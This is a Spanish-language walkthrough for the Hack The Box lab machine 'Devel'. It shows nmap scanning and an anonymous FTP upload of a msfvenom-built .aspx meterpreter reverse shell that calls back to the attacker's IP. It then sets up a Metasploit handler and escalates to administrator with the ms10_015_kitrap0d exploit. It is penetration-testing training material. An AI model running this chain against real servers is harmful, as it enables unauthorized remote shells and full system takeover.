---
title: Devel  
parent: Easy  
nav_order: 1  
---

# Walkthrough — Devel (Hack The Box)  
{: .fs-9 }

> Walkthrough para la máquina Devel de HTB, enfocado en explotar el acceso anónimo por FTP para ejecutar una reverse shell, y en escalar privilegios en un sistema Windows vulnerable mediante un exploit de elevación local.
{: .fs-6 .fw-300 }

---

![0](/assets/images/devel/0.png)

## Escaneo inicial

Empecé la máquina realizando un escaneo completo de puertos con `nmap -p-` sobre la IP `10.129.65.186` para identificar todos los puertos abiertos en la máquina objetivo. Detecté que los puertos 21 (FTP) y 80 (HTTP) están abiertos.

```bash
nmap -p- 10.129.65.186
```

![1](/assets/images/devel/1.png)

---

Hice un escaneo más detallado en los puertos 21 y 80 y vi que el FTP permite acceso anónimo; ahí encontré un par de archivos como `iisstarthtm` y una imagen llamada `welcome.png`.

```bash
nmap -p 21,80 -sV -sC -T5 10.129.65.186
```

![2](/assets/images/devel/2.png)

---

Me conecté al FTP como anónimo sin necesidad de contraseña y confirmé que se pueden ver y descargar los archivos disponibles.

```bash
ftp 10.129.65.186
```

![3](/assets/images/devel/3.png)

---

Como el acceso anónimo también me permitía subir archivos, decidí generar una reverse shell en formato `.aspx` usando `msfvenom`.  
Elegí `.aspx` porque el servidor parece estar corriendo **IIS sobre Windows**, y este tipo de servidor interpreta archivos ASP.NET por defecto.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.207 LPORT=4444 -f aspx -o gueco.aspx
```

![4](/assets/images/devel/4.png)  
![5](/assets/images/devel/5.png)

---

Levanté un handler en Metasploit con el payload `windows/meterpreter/reverse_tcp`, configurando mi IP y puerto 4444 para esperar la conexión inversa cuando se ejecute el archivo `.aspx` en la máquina víctima.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.207
set lport 4444
exploit
```

![6](/assets/images/devel/6.png)

---

Volvemos a la shell de Meterpreter y ponemos la sesión 2 en segundo plano para poder lanzar otros módulos desde Metasploit.

```bash
background
```

![7](/assets/images/devel/7.png)

---

Ejecuté el módulo `local_exploit_suggester` para ver qué vulnerabilidades locales podía aprovechar. Me mostró varias opciones, lo que indica que el sistema es bastante antiguo y vulnerable. He decidido usar `exploit/windows/local/ms10_015_kitrap0d`.

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

![8](/assets/images/devel/8.png)

---

Probé con el exploit `ms10_015_kitrap0d`, uno de los que me sugirió el `local_exploit_suggester`, y la jugada salió bien: se ejecutó sin errores, lanzó el payload y me dio una nueva sesión de Meterpreter con privilegios elevados.  
Básicamente, me convertí en administrador sin que el sistema se quejara.

```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 2
run
```

![9](/assets/images/devel/9.png)

---

**Autor:** [gueco99](https://github.com/gueco99)  
Hack the Box – *Devel* (Easy)